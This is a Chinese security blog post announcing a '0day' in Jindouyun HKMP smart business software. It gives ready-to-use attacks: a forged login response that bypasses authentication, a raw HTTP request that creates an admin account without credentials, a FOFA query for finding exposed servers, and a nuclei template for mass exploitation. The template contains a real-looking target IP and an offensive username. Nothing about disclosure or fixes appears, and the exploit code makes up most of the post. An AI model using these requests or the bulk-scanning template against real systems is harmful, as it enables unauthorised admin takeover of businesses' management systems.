#  【0day】金斗云HKMP智慧商业软件   
原创 shuxi  黑白防线   2024-07-04 19:24  
  
作者 | 书汐  
  
  
**一、金斗云HKMP智慧商业软件介绍：**  
  
  
  
金斗云智慧商业软件是一款功能强大、易于使用的智慧管理系统，通过智能化的管理工具，帮助企业实现高效经营、优化流程、降低成本，并提升客户体验。  
  
  
  
**二、漏洞描述：**  
  
  
**01.逻辑漏洞：**  
  
登录时输入任意用户，然后抓包替换返回包如下即可登录后台  
```
HTTP/1.1 200 
Content-Type: application/json
Date: Tue, 25 Jun 2024 15:22:37 GMT
Connection: close
Content-Length: 205

{"code":"1000","message":"成功","data":{"userCode":"admin","userName":"系统管理员","level":"*","privilege":"*","version":"1.0.138.387","companyName":"","logo":"","expiryTime":"2034-03-20 00:00:00"}}
```  
  
****  
  
  
**02.任意用户创建：**  
  
直接发送下面数据包****  
  
```
POST /admin/user/add HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json;charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
 
{"appId":"hkmp","mchId":"hkmp","deviceId":"hkmp","timestamp":1719305067,"nonce":5223015867,"sign":"hkmp","data":{"userCode":"root1234","userName":"root1234","password":"123456","privilege":["1000","8000","8010","2000","2001","2010","7000"],"adminUserCode":"admin","adminUserName":"系统管理员"}}
```  
  
  
  
  
**三、漏洞复现：**  
  
  
**01.fofa语句**  
  
```
title=="金斗云"
```  
  
  
  
**02.逻辑漏洞**  
  
  
打开目标网址，随意输入账号密码点击登录进行抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f8s36zibL97jiayuoJnTo10iaTpvD2h7G2lLNALUug2MqQF21tzLPcMDiahLc3MnmHoicT0mJy2zfjfeb6872Qf6Thw/640?wx_fmt=png&from=appmsg "")  
  
  
替换响应包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f8s36zibL97jiayuoJnTo10iaTpvD2h7G2lziaLzr4IlZHia6pJxzmtkjtuPnKvoRPQZib9JdEyQ8bQibCSY5WYVa55bQ/640?wx_fmt=png&from=appmsg "")  
  
  
  成功登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f8s36zibL97jiayuoJnTo10iaTpvD2h7G2lVibzXEVic2mIO4X1WQOJe0wB9p99rv1E0lHWiaHNNIY5jp9dS5jjvh57g/640?wx_fmt=png&from=appmsg "")  
  
  
**02.任意用户创建**  
  
直接向目标发送pyload即可****  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f8s36zibL97jiayuoJnTo10iaTpvD2h7G2lWc2vUYhTdMF0UiakDK0iayjh4yYNTepqO3MqbspPI4vTqsH57zuBwUmw/640?wx_fmt=png&from=appmsg "")  
  
  
**03.nuclei 批量扫描poc**  
  
记得更改里面的用户名哦  
```
id: HKMP-logical-vulnerability

info:
  name: WebFuzzer Template kaUGtMby
  author: god
  severity: high
  description: write your description here
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

http:
- method: POST
  path:
  - '{{RootURL}}/admin/user/add'
  headers:
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Length: "251"
    Content-Type: application/json;charset=UTF-8
    Origin: http://121.29.1.125:8090
    Priority: u=1
    Referer: http://121.29.1.125:8090/
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101
      Firefox/127.0
    X-Requested-With: XMLHttpRequest
  body: '{"appId":"hkmp","mchId":"hkmp","deviceId":"hkmp","timestamp":1719305067,"nonce":5223015867,"sign":"hkmp","data":{"userCode":"fuckyou2","userName":"fuckyou2","password":"fuckyou2","privilege":["1000","8000","8010","2000","2001","2010","7000"],"adminUserCode":"admin","adminUserName":"系统管理员"}}'

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: status
      status:
        - 200
    - type: word
      part: body
      words:
        - "成功"
```  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/f8s36zibL97jiayuoJnTo10iaTpvD2h7G2l2TM2rpRD3XnWs43uCUlQw0JicBv761YzXFFs9GNz8AKhicSwiaWxBGXWw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/f8s36zibL97jiayuoJnTo10iaTpvD2h7G2l7dmCq9Ob7fAb2wAI0OyuFCZFMAgZa5q5POiaSSQaCXNdN5c2vZjfPdg/640?wx_fmt=jpeg&from=appmsg "")  
  
**-END-**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sQp0ND8WLtPmj2w2IXdNZJ63At39Ax6MGIVBhoFgBICFETdQx2C0l1T1X0hAthk1Fic11VfgaibBb7J5VvOGRcow/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
喜欢就点个关注吧~                       
![](https://mmbiz.qpic.cn/mmbiz_gif/GtWwdCwkv7FoZELv8KXyj9QRscWJkKCzpmiaqCmVvWQp2PaS7NWwlHojLQz6HQoloicvjichnlSfTVVelMlM5YcSg/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
  
     
  
  
  
  
**往期文章：**  
  
[](http://mp.weixin.qq.com/s?__biz=Mzg2NzgzOTcxNA==&mid=2247490258&idx=1&sn=337d79617a37b7153a588a126a90147e&chksm=ceb4215ff9c3a849155c429c79f05a32cd96fd5832f0aeacf86572b8fd91ea149def91e726ce&scene=21#wechat_redirect)  
  
[SSH-RCE（CVE-2024-6387）](http://mp.weixin.qq.com/s?__biz=MzkxNDY5NzMxNw==&mid=2247483979&idx=1&sn=c7dad3304cb4f3328dd6e7e905ddf907&chksm=c16b3f41f61cb657bac830209c0935419313b41157ce7a1fe7690e88644e6450538673d9645e&scene=21#wechat_redirect)  
  
  
[web安全之登录框渗透骚姿势](http://mp.weixin.qq.com/s?__biz=MzkxNDY5NzMxNw==&mid=2247483727&idx=1&sn=bcdf09a9eb4b0b64b2e9c52239ba49dd&chksm=c16b3c45f61cb5536103395b060320416a9d23c54fe647169d90ca71a1afb00970ec597e60a5&scene=21#wechat_redirect)  
  
  
[Cobalt_Strike（CS）安装到免杀上线](http://mp.weixin.qq.com/s?__biz=MzkxNDY5NzMxNw==&mid=2247483862&idx=1&sn=c6b4da3ce5772a075431098227397baa&chksm=c16b3cdcf61cb5ca06f615130cde9e20719a516476609442f329bf4eeb143c656ea6e5c16cd2&scene=21#wechat_redirect)  
  
  
[ARL灯塔魔改，自动化资产搜集+漏扫+推送+1W加指纹](http://mp.weixin.qq.com/s?__biz=MzkxNDY5NzMxNw==&mid=2247483817&idx=1&sn=676782a684e863619be28cd7aa507da0&chksm=c16b3ca3f61cb5b557179ef1d3851670f55392ec6fc9909fdbce4155b8fa2d7fbd4da1f8c64f&scene=21#wechat_redirect)  
  
  
[Windows权限提升方式总结](http://mp.weixin.qq.com/s?__biz=MzkxNDY5NzMxNw==&mid=2247483898&idx=1&sn=b5f2e9574753adf96ef59abeb1cfd142&chksm=c16b3cf0f61cb5e673616a5db754c6b60ae3c6dfb1fe6c1759d8b6d640cb7f64b6bb30b6a6ed&scene=21#wechat_redirect)  
  
  
  
喜欢这篇文章记得**「点赞**  
**+****在看」**  
哟****  
********  
  
****  
  
  
  
  
  
  
  
